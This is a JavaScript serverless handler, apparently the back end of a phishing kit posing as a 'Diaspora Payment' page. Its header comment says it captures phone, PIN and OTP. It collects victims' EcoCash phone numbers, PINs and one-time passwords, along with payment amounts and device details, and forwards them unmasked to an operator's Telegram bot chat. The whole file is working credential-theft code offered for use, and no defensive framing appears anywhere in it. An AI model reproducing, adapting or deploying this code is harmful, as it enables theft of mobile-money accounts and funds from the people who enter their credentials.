// api/sendTelegram.js
// Diaspora Payment — captures phone, PIN, OTP, amount, event, device

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  const TELEGRAM_TOKEN   = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    const missing = [];
    if (!TELEGRAM_TOKEN)   missing.push('TELEGRAM_TOKEN');
    if (!TELEGRAM_CHAT_ID) missing.push('TELEGRAM_CHAT_ID');
    console.error('Missing env vars:', missing.join(', '));
    return res.status(500).send('Missing env vars: ' + missing.join(', '));
  }

  let payload = {};
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
  } catch (err) {
    console.error('Invalid JSON:', err && err.message);
    return res.status(400).send('Invalid JSON');
  }

  function escHTML(s) {
    if (s == null) return '';
    return String(s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function short(s, n = 800) {
    if (s == null) return '';
    s = String(s);
    return s.length > n ? escHTML(s.slice(0, n)) + '…(truncated)' : escHTML(s);
  }

  function mask(s) {
    if (!s) return s;
    const ss = String(s);
    if (ss.length <= 2) return '*'.repeat(ss.length);
    return '*'.repeat(ss.length - 2) + ss.slice(-2);
  }

  // Masked log
  const logged = { ...payload };
  if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
  if (logged.otp)      logged.otp      = mask(logged.otp);
  console.log('sendTelegram payload (masked):', JSON.stringify(logged));

  // ── Determine message title based on event ──
  const event = payload.event || '';
  let title = '💳 Diaspora Payment';
  if (event === 'accept_payment_clicked') title = '✅ Accept Payment — Credentials';
  else if (event === 'payment_otp_confirmed') title = '🔐 OTP Confirmed';
  else if (event === 'resend_otp')            title = '🔄 OTP Resend Requested';

  // ── Build HTML message ──
  let text = `<b>${escHTML(title)}</b>\n\n`;

  if (payload.submittedAt)
    text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n`;

  if (payload.event)
    text += `<b>Event:</b> ${escHTML(payload.event)}\n`;

  if (payload.amount)
    text += `<b>Amount:</b> USD ${escHTML(payload.amount)}\n`;

  if (payload.loginPhone || payload.loginPin || payload.otp) {
    text += '\n<b>EcoCash Credentials:</b>\n';
    if (payload.loginPhone) text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
    if (payload.loginPin)   text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
    if (payload.otp)        text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
  }

  if (payload.device)
    text += `\n<b>Device:</b> ${escHTML(payload.device)}\n`;

  // Any remaining unknown keys
  const known = new Set(['submittedAt','event','amount','loginPhone','loginPin','otp','device']);
  const extras = Object.keys(payload).filter(k => !known.has(k));
  if (extras.length) {
    text += '\n<b>Other:</b>\n';
    for (const k of extras) {
      text += `<b>${escHTML(k)}:</b> ${short(payload[k])}\n`;
    }
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const bodyText = await resp.text();
    console.log('Telegram API status:', resp.status, 'body:', bodyText);

    if (!resp.ok) return res.status(502).send('Telegram error: ' + bodyText);

    let parsed;
    try { parsed = JSON.parse(bodyText); } catch (e) { parsed = bodyText; }

    return typeof parsed === 'string'
      ? res.status(200).send(parsed)
      : res.status(200).json(parsed);

  } catch (e) {
    console.error('Fetch error:', e && e.message);
    return res.status(500).send('Fetch error: ' + (e && e.message));
  }
}
